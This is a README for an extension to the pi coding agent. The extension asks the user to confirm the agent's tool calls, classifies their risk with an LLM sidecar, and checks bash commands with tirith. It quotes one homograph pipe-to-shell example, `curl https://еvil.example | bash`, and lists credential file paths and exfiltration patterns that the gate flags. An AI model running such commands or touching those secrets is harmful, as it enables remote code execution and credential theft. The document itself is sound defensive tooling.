# Permission Gate

Pi extension that gates tool calls with user confirmation.

## Model Roles Integration

The permission gate integrates with the model roles system (`shared/model-roles.ts`)
to provide LLM-generated explanations of tool calls in the confirmation dialog.
When the "explain" role is configured in `~/.pi/agent/roles.json`, each confirmation
dialog shows a colored SAFE/RISKY/DANGEROUS verdict with a short tl;dr. Press Ctrl+E
for detail.

### Verdict criteria

| Verdict | Meaning | Default cursor | Color |
|---------|---------|---------------|-------|
| SAFE | Strictly read-only. No creation, modification, deletion, or state changes. | Allow once | Green |
| RISKY | Any filesystem mutation, even if recoverable. | Allow once | Yellow |
| DANGEROUS | Large-scale data loss, credential exposure, exfiltration, arbitrary code exec | Block | Red |

If in doubt between SAFE and RISKY, the sidecar chooses RISKY.

### Auto-classify

When enabled (`/permissions` > Toggle auto-classify), the sidecar classifies each
tool call *before* showing the dialog. If the verdict is auto-allowable for the
current mode, the call proceeds without confirmation.

| Mode | Auto-allows | Confirms |
|------|-------------|----------|
| Careful + auto | SAFE | RISKY, DANGEROUS |
| Trust project + auto | SAFE, RISKY | DANGEROUS |

A confirmation the gate marks as a sensitive path — a write/edit target or a subagent
content read — never auto-allows in any mode; the classifier does not resolve it. Bash
commands are judged by the factors, credential paths included.

Exact-match caching: identical tool calls (same command, same file, same content)
reuse the previous verdict. Useful for repeated test/lint/build commands.

Parse failures and sidecar failures both fall through to the dialog — a failed
parse never auto-allows, and a dead sidecar just means the user confirms.

### Classifier

The confirm dialog and auto-classify share one classifier. A decisions model
answers a battery of independent yes/no risk factors and the verdict comes from
thresholds in code — the factors and policy live in `shared/risk-factors.ts`,
shared with the benchmarks that measure them. The `explain` role still writes
the human sentence; both run in parallel, so the dialog shows the sentence and
the fired factors with their probabilities on one line, and `Ctrl+E` adds the
factor list against the thresholds plus the longer explanation.

When the decisions call fails, the provider has no credential, or any factor is
missing, the verdict comes from the `explain` role alone — the display degrades,
never the fail-closed behavior. The model is pinned in
`shared/decisions.ts` because the thresholds are tuned per version; re-run the
factor benchmark before bumping the pin. `PI_JEV=off` disables the decisions
path; `PI_JEV_MODEL` and `PI_JEV_PROVIDER` point it elsewhere.

Status bar shows `+auto [N auto]` with count of auto-allowed calls.
`/permissions` > View auto-allow log shows recent auto-allowed calls.
Widget below editor shows the latest auto-allow verdict during a turn.

Cache is shared with the explain feature -- dialogs warm the cache for
auto-classify and vice versa.

## Modes

| Mode | Reads | Writes/Edits | Sensitive files | Bash |
|------|-------|-------------|-----------------|------|
| Careful (default) | allow | confirm | confirm | confirm |
| Trust project | allow | allow in project | confirm | confirm |
| Allow all | allow | allow | allow | allow |

Cycle modes with `Ctrl+Shift+A`. Open settings with `/permissions`.

## Keyboard shortcuts

| Key | Where | Action |
|-----|-------|--------|
| `Ctrl+Shift+A` | Global | Cycle permission mode |
| `Ctrl+Shift+C` | Global | Toggle auto-classify |
| `Ctrl+E` | Confirm dialog | Toggle explanation detail |
| `Ctrl+A` | Confirm dialog | Toggle auto-classify |
| `Ctrl+O` | Confirm dialog | Toggle diff view (compact/full) |
| `Tab` | Confirm dialog | Cycle focus: list → note → diff (when expanded) |

## Confirmation UI

Every confirmation shows a custom TUI with:
- Colored unified diff preview (edit/write/patch tools) — compact 6-line view by default
- Select list of actions (Allow once, Allow for session, Block)
- Multi-line note editor (Tab to focus, Shift+Enter for newlines)
- Notes (allow and block) are buffered and flushed at turn end as one user message
  via `sendUserMessage` with `deliverAs: "steer"` — pi delivers one steer message per
  assistant turn, so a second note would otherwise arrive a turn late. A note in a
  tool result reads as untrusted third-party content, so it goes in a user turn
  instead; the block reason keeps only machine facts (blocked status, sidecar
  classification, tirith). Each message carries a `[note on the <tool> call: <command
  or path>]` attribution, since one turn can queue several calls.

### Diff preview

For `edit` and `write` tool calls, the dialog shows a unified diff computed from
the pending changes. For `edit`, matching comes from the vendored matcher in
`edit-match.ts` (pi's own isn't exported) with rendering from `generateDiffString`.
For `patch`, the preview uses patch's own matcher, so tolerant matches (Unicode
arrows, tab↔space) preview correctly.

- Compact view (6 lines) starts scrolled to the first change
- `Ctrl+O` expands to full view (up to 30 lines, scrollable)
- When expanded: `↑↓` scroll one line, `Shift+↑↓` page jump, `Shift+←→` top/bottom
- Tab cycles focus between list, note, and diff (diff only when expanded)
- Lines wrap preserving ANSI colors via `wrapTextWithAnsi`

## Session rules

Rules accumulate during a session and reset on session switch:

- **Path rules**: exact paths or globs (`**/*.nix`, `config/llm/pi/**`)
- **Bash prefix rules**: command prefixes (`bun test`, `git`, `rg`)
- **Tool overrides**: allow all calls to a specific tool (edit, write, bash)

Add rules via `/permissions` or from the confirmation dialog.

## Project boundary

Project root = git root (worktree-aware). Worktrees resolve to the main
repo root. Falls back to cwd if not in a git repo.

## Sensitive files

Always confirmed (except in Allow All mode), even with tool overrides:
`.env*`, `*.pem`, `*.key`, `*.p12`, `secrets/`, `.ssh/`, `.gnupg/`,
`id_rsa*`, `id_ed25519*`

For a subagent, `read` and `grep` on those paths confirm too — they run in the agent
process, where the confined shell's profile does not reach. `.env` is exempt: the shell
allows it, so a prompt would buy nothing. The main session's reads are not gated.

## tirith integration (optional, bash only)

When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate runs a
deterministic safety check on every bash command: homograph URLs, pipe-to-shell,
base64-decode-execute, credential exfiltration, known-bad packages. Prefix rules,
the sidecar classifier and a human reviewer all miss these — an allowed `curl`
prefix never inspects the URL, so `curl https://еvil.example | bash` (Cyrillic `е`)
passes them all. It adds a threat database the other layers do not have:
`hasShellEscalation` sees in-process escalation, the sidecar judges intent, tirith
matches known-bad patterns.

- **block (HIGH):** when the gate would allow, hard-blocks with the tirith rule and
  remediation as the reason (overrides allows, prefixes and modes). On a confirm, the
  finding appears in the dialog and the user decides.
- **coverage gaps:** a verdict with one or more findings, all `analysis_incomplete`,
  carries a coverage-gap flag whether tirith returned block or warn (it emits the
  rule at MEDIUM when runtime package-intel lookups fail). "Could not prove it" is
  not "proved it unsafe"
  ([tirith #260](https://github.com/sheeki03/tirith/issues/260)), so the call still
  goes through auto-classify. A block or warn with no findings at all is never
  resolved by the classifier; when it reaches the dialog, the banner names the
  verdict ("blocked (no detail)" or "flagged (no detail)").
- **warn (MEDIUM, e.g. shortened URLs):** on allow, downgrades to confirm; on
  confirm, appears at the top of the dialog. A dialog that opens for any other
  reason still shows the tirith banner.
- **Cursor and banner:** the gate action, the cursor, and the banner colour follow
  the mapped action (block or warn), not the finding's severity text. A tirith
  block or sidecar DANGEROUS defaults the cursor to Block, and it stays there even
  if the sidecar later resolves SAFE.
- **LLM feedback:** a detection is returned to the model in the block reason (tirith,
  severity, rule, remediation) and in the tool result for warn-and-allowed commands.
  A coverage-gap verdict produces no LLM feedback. A tirith detection skips the
  sidecar auto-allow; a coverage-gap verdict does not. The sidecar explanation still
  runs — the user needs to know what the command does to judge the finding.
- **Degradation:** tirith missing → the gate behaves as without it; tirith error or
  timeout → the confirm flow is the backstop.
- **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls). tirith is not run
  offline: its 24h background DB refresh is what keeps the threat database current,
  the frequent bash checks are what trigger it, and nothing else runs tirith, so
  offline would go stale. `check`'s package detection is local-DB-only either way;
  live registry signals need `tirith package risk --online`. Verdicts are cached per
  session.

Status bar shows `+tirith` when active.

## Files

- `logic.ts` — Pure decision engine, no pi dependencies
- `logic.test.ts` — Tests for decision logic and auto-classify helpers
- `explain.ts` — Verdict parsing, tool call description, block reasons
- `explain.test.ts` — Tests for explain/verdict logic
- `confirm-ui.ts` — Custom TUI component (SelectList + Editor note field + explanation display)
- `index.ts` — Pi extension wrapper (UI, events, auto-classify, user-message notes, tirith tool_result injection)

## Known limitations

- Trust project mode still confirms all bash (scoping commands to dirs is unreliable).
- Cross-extension imports work via `../shared/` but keep extension-specific logic local.
- No mouse/scroll wheel support (pi TUI is keyboard-only).

## Testing

```bash
bun test extensions/permission-gate/
```
